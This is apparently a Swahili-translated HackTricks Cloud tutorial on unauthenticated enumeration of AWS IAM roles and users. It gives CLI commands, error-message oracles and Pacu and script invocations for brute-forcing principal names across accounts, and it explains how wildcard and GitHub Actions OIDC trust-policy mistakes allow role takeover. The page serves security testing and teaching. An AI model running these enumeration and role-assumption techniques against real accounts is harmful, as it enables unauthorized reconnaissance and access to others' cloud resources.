# AWS - IAM & STS Unauthenticated Enum

{% hint style="success" %}
Jifunze na zoea Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoea Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Enumerate Majukumu & Majina ya Watumiaji kwenye akaunti

### ~~Fikiria Kujaribu Kujukumu~~

{% hint style="danger" %}
**Mbinu hii haifanyi kazi** tena kwa sababu ikiwa jukumu lipo au la, daima utapata kosa hili:

`Kumetokea kosa (AccessDenied) wakati wa kuita shughuli ya AssumeRole: Mtumiaji: arn:aws:iam::947247140022:user/testenv hana idhini ya kufanya: sts:AssumeRole kwenye rasilimali: arn:aws:iam::429217632764:role/account-balanceasdas`

Unaweza **jaribu hili kwa kukimbia**:

`aws sts assume-role --role-arn arn:aws:iam::412345678909:role/superadmin --role-session-name s3-access-example`
{% endhint %}

Kujaribu **kujukumu bila idhini inayostahili** husababisha ujumbe wa kosa wa AWS. Kwa mfano, ikiwa huna idhini, AWS inaweza kurudisha:
```ruby
An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::012345678901:user/MyUser is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::111111111111:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS
```
Hii ujumbe unathibitisha uwepo wa jukumu lakini unaonyesha kwamba sera yake ya kuchukua jukumu hairuhusu dhana yako. Kwa upande mwingine, jaribio la **kuchukua jukumu lisililopo husababisha kosa tofauti**:
```less
An error occurred (AccessDenied) when calling the AssumeRole operation: Not authorized to perform sts:AssumeRole
```
Kwa kuvutia, njia hii ya **kutofautisha kati ya majukumu yanayopo na yasiyopo** inaweza kutumika hata kati ya akaunti tofauti za AWS. Kwa kitambulisho halali cha akaunti ya AWS na orodha ya maneno iliyolengwa, mtu anaweza kuchambua majukumu yaliyopo kwenye akaunti bila kukutana na vizuizi vyovyote.

Unaweza kutumia [script huu kuchambua mabwana wanaowezekana](https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/assume\_role\_enum) kwa kutumia suala hili.

### Sera za Kuamini: Kuvunja Nguvu Majukumu na Watumiaji kati ya Akaunti

Kuweka au kusasisha **sera ya kuamini ya jukumu la IAM kunahusisha kufafanua ni rasilimali au huduma zipi za AWS zinaruhusiwa kuchukua jukumu hilo** na kupata sifa za muda. Ikiwa rasilimali iliyotajwa katika sera **ipo**, sera ya kuamini inahifadhiwa **kwa mafanikio**. Hata hivyo, ikiwa rasilimali **haipo**, **kosa linazalishwa**, ikionyesha kwamba mabwana batili walitolewa.

{% hint style="warning" %}
Tafadhali elewa kwamba katika rasilimali hiyo unaweza kufafanua jukumu au mtumiaji kati ya akaunti:

* `arn:aws:iam::acc_id:role/role_name`
* `arn:aws:iam::acc_id:user/user_name`
{% endhint %}

Hii ni mfano wa sera:
```json
{
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":
{
"AWS":"arn:aws:iam::216825089941:role\/Test"
},
"Action":"sts:AssumeRole"
}
]
}
```
#### GUI

Hii ni **kosa** utakaloliona ikiwa unatumia **jukumu ambalo halipo**. Ikiwa jukumu **ipo**, sera ita **hifadhiwa** bila makosa yoyote. (Kosa ni kwa ajili ya kuboresha, lakini pia inafanya kazi wakati wa kuunda)

![](<../../../.gitbook/assets/image (68).png>)

#### CLI
```bash
### You could also use: aws iam update-assume-role-policy
# When it works
aws iam create-role --role-name Test-Role --assume-role-policy-document file://a.json
{
"Role": {
"Path": "/",
"RoleName": "Test-Role",
"RoleId": "AROA5ZDCUJS3DVEIYOB73",
"Arn": "arn:aws:iam::947247140022:role/Test-Role",
"CreateDate": "2022-05-03T20:50:04Z",
"AssumeRolePolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::316584767888:role/account-balance"
},
"Action": [
"sts:AssumeRole"
]
}
]
}
}
}

# When it doesn't work
aws iam create-role --role-name Test-Role2 --assume-role-policy-document file://a.json
An error occurred (MalformedPolicyDocument) when calling the CreateRole operation: Invalid principal in policy: "AWS":"arn:aws:iam::316584767888:role/account-balanceefd23f2"
```
Unaweza kusakinisha mchakato huu kiotomatiki kwa [https://github.com/carlospolop/aws\_tools](https://github.com/carlospolop/aws\_tools)

* `bash unauth_iam.sh -t user -i 316584767888 -r TestRole -w ./unauth_wordlist.txt`

Tumia [Pacu](https://github.com/RhinoSecurityLabs/pacu):

* `run iam__enum_users --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* `run iam__enum_roles --role-name admin --account-id 229736458923 --word-list /tmp/names.txt`
* Jukumu la `admin` lililotumiwa kwenye mfano ni **jukumu katika akaunti yako litakalotumiwa kujifanya** na pacu ili kuunda sera inayohitajika kwa uchambuzi

### Privesc

Kwa hali ambapo jukumu limeconfigure vibaya na kuruhusu yeyote kujifanya kuwa hivyo:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "sts:AssumeRole"
}
]
}
```
## Ufikiri

Fikiria kwamba unaweza kusoma **mfumo wa hatua za Github** ambao unapata **jukumu** ndani ya **AWS**.\
Imani hii inaweza kumpa ufikiaji wa jukumu lenye **sera ya imani** ifuatayo:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Federated": "arn:aws:iam::<acc_id>:oidc-provider/token.actions.githubusercontent.com"
},
"Action": "sts:AssumeRoleWithWebIdentity",
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
}
}
}
]
}
```
Hii sera ya uaminifu inaweza kuwa sahihi, lakini **ukosefu wa hali zaidi** unapaswa kukufanya usiwe na imani nayo.\
Hii ni kwa sababu jukumu lililopita linaweza kuchukuliwa na **MTU yeyote kutoka Github Actions**! Unapaswa kutoa maelezo zaidi kwenye hali kama jina la org, jina la repo, env, tawi...

Hitilafu nyingine inayowezekana ni kuongeza **hali nyingine** kama ifuatavyo:
```json
"StringLike": {
"token.actions.githubusercontent.com:sub": "repo:org_name*:*"
}
```
Tafadhali kumbuka **alama ya pekee** (\*) kabla ya **mabano** (:). Unaweza kuunda shirika kama **jina_la_org1** na **kudai jukumu** kutoka kwa Hatua ya Github.

## Marejeo

* [https://www.youtube.com/watch?v=8ZXRw4Ry3mQ](https://www.youtube.com/watch?v=8ZXRw4Ry3mQ)
* [https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/](https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/)

{% hint style="success" %}
Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
